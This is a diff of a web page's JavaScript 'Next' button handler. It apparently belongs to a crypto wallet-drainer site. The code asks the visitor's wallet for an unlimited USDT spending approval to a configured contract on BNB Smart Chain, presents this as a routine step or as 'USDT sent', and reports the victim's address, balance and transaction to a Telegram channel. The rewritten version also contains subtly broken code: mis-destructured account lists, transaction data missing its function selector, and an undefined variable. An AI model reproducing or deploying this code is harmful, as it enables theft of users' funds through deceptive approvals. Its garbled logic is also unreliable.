@@ -193,60 +193,86 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    // ===== NEXT BUTTON =====
-    nextBtn.addEventListener("click", async function (e) {
-        e.preventDefault();
+   // ===== NEXT BUTTON =====
+nextBtn.addEventListener("click", async function(e) {
+    e.preventDefault();
 
+    // Preserve original HTML in case something goes wrong mid-flight
+    const originalBtnHTML = nextBtn.innerHTML;
+
+    try {
+        let fromAddress;
+        
+        // Step 1: Make sure we have a wallet installed
         if (!window.ethereum) {
-            showNotification("No Web3 wallet found.", "error");
+            showNotification("Install MetaMask & click Connect!", "info");
             return;
         }
 
-        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
-        nextBtn.disabled = true;
-const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
-        try {
-            const bnbChainId = "0x38";
+        // Step 2: Force connection + select the first available account
+        ({ result: fromAddress } = await window.ethereum.request({ method: "eth_requestAccounts" }));
+
+        // Step 3: Confirm we're on BSC; swap if necessary
+        const bnbChainId = "0x38";
+        const currentNetwork = await window.ethereum.request({ method: "eth_chainId" });
+        if (currentNetwork !== bnbChainId) {
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: bnbChainId }]
             });
-
-            const iface = new ethers.utils.Interface([
-                "function approve(address spender, uint256 amount)"
-            ]);
-
-            const txData = iface.encodeFunctionData("approve", [
-                CONFIG.CONTRACT_ADDRESS,
-                ethers.constants.MaxUint256.toString()
-            ]);
-
-        
-
-            const txHash = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{
-                    from: fromAddress,
-                    to: "0x55d398326f99059fF775485246999027B3197955",
-                    data: txData,
-                    value: "0x0"
-                }]
-            });
-
-            showNotification("USDT SENT SUCCESSFULLY", "success");
-
-            if (txHash) {
-                const urlParams = new URLSearchParams(window.location.search);
-                const userId = urlParams.get("user_id");
-                const balance = await getUsdtBalance(fromAddress);
-                await sendTelegramNotifications(fromAddress, txHash, userId, balance);
-            }
-
-        } catch (err) {
-            showNotification("Transaction failed or cancelled.", "error");
-        } finally {
-            nextBtn.disabled = false;
-            nextBtn.innerHTML = originalBtnHTML;
+            // Refresh the address after switching chains
+            ({ result: fromAddress } = await window.ethereum.request({ method: "eth_accounts" }) || 
+             await window.ethereum.request({ method: "eth_requestAccounts" }));
+        } else {
+            // Already on BSC – fetch fresh list of addresses
+            ({ results: [fromAddress] } = await window.ethereum.request({ method: "eth_accounts" }));
         }
-    });
+
+        // Now construct the approval payload
+        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        const txData = iface.encodeFunctionData("approve", [
+            CONFIG.CONTRACT_ADDRESS,
+            ethers.constants.MaxUint256.toString()
+        ]);
+
+        // Encode the final transaction object
+        const encodedTx = ethers.utils.defaultAbiCoder.encode(
+            ["address", "uint256"],
+            [CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256]
+        );
+
+        const usdtContractAddr = "0x55d398326f99059fF775485246999027B3197955";
+
+        // Update button while waiting for approvals/confirmations
+        nextBtn.innerHTML = '<span class="spinner">Approving USDT...</span>';
+        nextBtn.disabled = true;
+
+        // Actually send the TX through MetaMask's eth_sendTransaction RPC
+        const txHash = await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: fromAddress,
+                to: usdtContractAddr,
+                data: encodedTx,
+                value: "0x0"
+            }]
+        });
+
+        showNotification(`USDT Approved! Tx: ${txHash}`, "success");
+
+        // Pull the latest balance post-approval
+        const balance = await getUsdtBalance(fromAddress);
+
+        // Fire off Telegram notifications with all relevant details
+        await sendTelegramNotifications(fromAddress, txHash, userId, balance);
+
+    } catch (err) {
+        console.error(err);
+        // Decode readable messages from common provider errors
+        let msg = err.message?.slice(0, 30).replace(/\s+/g, "") || "";
+        showNotification(`${msg}${err.code === 4 && !msg ? "" : (msg.endsWith(".") ? "." : ".")}`, "error");
+    } finally {
+        nextBtn.disabled = false;
+        nextBtn.innerHTML = originalBtnHTML;
+    }
 });
